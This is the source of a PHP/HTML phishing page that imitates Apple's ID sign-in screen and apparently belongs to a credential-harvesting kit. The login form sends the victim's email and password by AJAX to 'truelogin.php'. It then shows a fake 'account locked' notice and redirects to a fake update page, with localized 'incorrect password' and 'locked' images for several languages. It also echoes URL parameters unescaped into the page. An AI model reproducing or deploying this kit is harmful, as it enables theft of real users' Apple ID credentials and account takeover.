<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title</title>";
?>
    <link rel="stylesheet" type="text/css" href="../assets/css/style-login-mobile.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/style-login-desktop.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/modal.css">
    <script type="text/javascript" src="../assets/js/script-login-mobile.js"></script>
    <script type="text/javascript" src="../assets/js/modal.js"></script>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />

<script type='text/javascript'>
//<![CDATA[
$(window).load(function(){
$(".optiona").click(function(){
    $(this).toggleClass('optiona2')
});
});//]]> 

$(document).ready(function(){
    $("#salahs").click(function(){
        $("#salahs").fadeOut("slow");
    });
});
function ChangePlaceholder1(){
document.getElementById("xuser_m_login").placeholder = "name@example.com";
}
function ChangeBack1(){
document.getElementById("xuser_m_login").placeholder = "Apple ID";
}
function Activate1(){
document.getElementById('xbtn_m_login').className = "xbtn1_m_login";
}
function Bukapass(){
document.getElementById("xuser_m_login").style.borderRadius = "0";
document.getElementById("xuser_m_login").style.borderTopLeftRadius = "6px";
document.getElementById("xuser_m_login").style.borderTopRightRadius = "6px";
document.getElementById('bukapass_m_login').style.display = "none";
document.getElementById('xpass_m_login').style.display = "block";
document.getElementById('xbtn_m_login').style.display = "block";
document.getElementById('loading_m_login1').style.display = "none";
}
function loading1(){
document.getElementById('loading_m_login').style.display = "block";
document.getElementById('xbootn_m_login').style.display = "none";
document.getElementById('xbtn_m_login').style.display = "none";
}
$(document).ready(function() {
    document.getElementById('xpass_m_login').style.display = "none";
    document.getElementById('xbtn_m_login').style.display = "none";
    $('#xuser_m_login').keypress(function(e) {
    if (e.which == 13) {
      document.getElementById('bukapass_m_login').style.display = "none";
        document.getElementById('loading_m_login1').style.display = "block";
        setTimeout(Bukapass, 2000);
        e.preventDefault();
    }
});
function showpesan() {
    $.alert('<?php echo $pesan_lock;?><?php echo $pesan2_lock;?>','<?php echo $judul_lock;?>', function () {
                $(location).attr('href', '<?php echo "?view=update&/IDMSWebAuth/update.html?&appIdKey=".$_SESSION['key']."&country=".$cid;?>');
            });
}
$("#form_login_m").on('submit', function(e){
    document.getElementById('loading_m_login').style.display = "block";
    document.getElementById('xbootn_m_login').style.display = "none";
    document.getElementById('xbtn_m_login').style.display = "none";
    e.preventDefault();
        $.ajax({
          type: 'POST',
          url: 'truelogin.php',
          data: $('#form_login_m').serialize(),
          success: function() {
              $('#result').load('files/locked-mobile.php?country=<?php echo $_GET['country'];?>');
            //document.getElementById('lockednya').style.display = "block";
            document.getElementById('form_login_m').style.display = "none";
          },
          error: function() {
            console.log("Signup was unsuccessful");
          }
        });
    });
});
</script>
<?php 
      if($lang == "ES") {
        $img = "apple-es.png";
      }else{
      if($lang == "FR") {
        $img = "apple-fr.png";
      }else{
        $img = "logo.png";
      }
      }
      $incor = "../assets/img/incorrect.png";
      $locked = "../assets/img/apple_locked.png";
      $width = "299";
      $height = "63";
      $top = "180";
      $left = "215";
      if($lang == "JP") {
        $incor = "../assets/img/incorrect-jp.png";
        $locked = "../assets/img/apple_locked-jp.png";
        $width = "299";
        $height = "63";
        $top = "200";
        $left = "180";
      }
      if($lang == "FR") {
        $incor = "../assets/img/incorrect-fr.png";
        $locked = "../assets/img/apple_locked-fr.png";
        $width = "299";
        $height = "83";
        $top = "200";
      }
      if($lang == "ES") {
        $incor = "../assets/img/incorrect-es.png";
        $locked = "../assets/img/apple_locked-es.png";
        $width = "299";
        $height = "83";
        $top = "200";
      }
      if($lang == "CN") {
        $incor = "../assets/img/incorrect-cn.png";
        $locked = "../assets/img/apple_locked-cn.png";
        $width = "299";
        $height = "63";
        $top = "160";
      }
      ?>
<style>
.incorrects {
  background-image: url("<?php echo $incor;?>");
  background-repeat: no-repeat;
  width: <?php echo $width;?>px;
  height: <?php echo $height;?>px;
  top: 235px;
  left: 20px;
  border-radius: 8px;
  position: absolute;
}

.locked_m {
  background-image: url("<?php echo $locked;?>");
  background-repeat: no-repeat;
  width: 550px;
  height: 400px;
  top: 60px;
  left: -40px;
  position: absolute;display: none;
}
.button:focus>span {
    -webkit-box-shadow:0 0 6px #007eff;
    -moz-box-shadow:0 0 6px #007eff;
    box-shadow:0 0 6px #007eff
}
.button:focus {
    outline:1px dotted black \0/
}
.button:hover {
    text-decoration:none
}
.button:-moz-focusring {
    outline:1px dotted
}
.button.disabled>span, .button.disabled:hover>span {
    cursor:default;
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
}
.button.rect.disabled {
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
    background:#4c88bc;
}

.ns .button, .button.rect {
    font-size: 17px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec, #0070c9);
    border-color: #07c;
    border-width: 1px;
    border-style: solid;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding-left: 15px;
    padding-right: 15px;
    padding-top: 4px;
    padding-bottom: 4px;
    text-align: center;
    white-space: nowrap
}
.ns .button:hover, .ns .button:focus, .button.rect:hover, .button.rect:focus {
    background:#0351b7;
    background:-webkit-linear-gradient(#2f90d5, #0351b7);
    background:-moz-linear-gradient(#2f90d5, #0351b7);
    background:linear-gradient(#2f90d5, #0351b7)
}
.ns .button:active, .ns .button.active, .button.rect:active, .button.rect.active {
    -webkit-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    -moz-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5)
}
.ns .button.community-alt {
    background:0;
    border:0;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button.community-alt:active, .ns .button.community-alt.active {
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button>span, .button.rect>span {
    color:#fff;
    font-size:13px;
    line-height:15px;
    padding:9px 28px;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none;
    background:0;
    border:0;
    -webkit-border-radius:4px;
    -moz-border-radius:4px;
    border-radius:4px
}
.ns .compound-button .handle>span {
    font-size:13px
}
.ns .button:hover>span, .ns .button:focus>span, .button.rect:hover>span, .button.rect:focus>span {
    background-color:transparent;
    border-color:transparent;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.button.rect.small>span {
    padding:7px 18px
}
.button.rect.large>span {
    font-size:18px;
    line-height:16px;
    padding:12px 28px
}
input[type=checkbox] {
    font-size: 19px;
    line-height: 1.47384;
    font-weight: 400;
    letter-spacing: .015em;
    font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    color: #fff;
    padding: 0;
    width: 30px;
    vertical-align: top;
}
</style>
</head>
<body>
<div id="bottom_m_login"></div>
  <div id="i1"></div>
  <div id="i2"></div>
  <div id="i3"></div>
<div id="head_m_login">
  <!-- <img src="mobile/img/login.png" style="height:100%;width:auto;"> -->
</div>


<div id="container_m_login">
  <div id="xheader_m_login">
    <div id="navbar_m_login"></div>
  </div>
  <div id="result"></div>
  <div id="xcontent_m_login" class="fade-in1">
    <form action="" autocomplete="off" id="form_login_m" method="POST" target="_self" name="xlogin">
      
      <font id="Apple_ID"><img src="../assets/img/<?php echo $img;?>" width="200px"></font>
      <font id="Manage_Account_m_login"><b><?php echo $login_manage;?></b></font>
      
      <div id="xXxLogin">
        <input name="xuser" id="xuser_m_login" style="border-radius:6px;" type="email" value="<?php echo $_GET['email'];?>" required="required" placeholder="Apple ID" onblur="ChangeBack1();" onclick="ChangePlaceholder1();">
        <input name="xpass" id="xpass_m_login" type="password" value="" required="required" placeholder="<?php echo $input_password;?>" onkeyup="Activate();">
        <div id="xbootn_m_login"><span id="bukapass_m_login" style="position:absolute;top:140px;" onclick="document.getElementById('loading_m_login1').style.display = 'block';document.getElementById('bukapass_m_login').style.display = 'none';setTimeout(Bukapass, 2000);" class="xbtn1_m_login"></span><input name="xbtn" id="xbtn_m_login" class="xbtn1_m_login" type="submit" value=""></div>
        <div id="loading_m_login"></div>
        <div id="loading_m_login1" style="position:absolute;top:140px;"></div>
      </div>
      <input type="checkbox" style="position:absolute;top:247px;left:95px;">
      <font id="Remember_me_m_login"><?php echo $remember_me;?></font>
      <?php
      if($_GET['error'] == 1) {
      echo '<span id="salahs" class="incorrects"></span>';
      }?>
      
      
      <font id="Forgot_Apple_ID_m_login"><?php echo $forgot_id;?></font>
    </form>
  </div>
  <br><br><br><br><br><br>
  <div id="<?php echo $bahasa;?>footer_m_login"></div>
</div>
</body>
</html>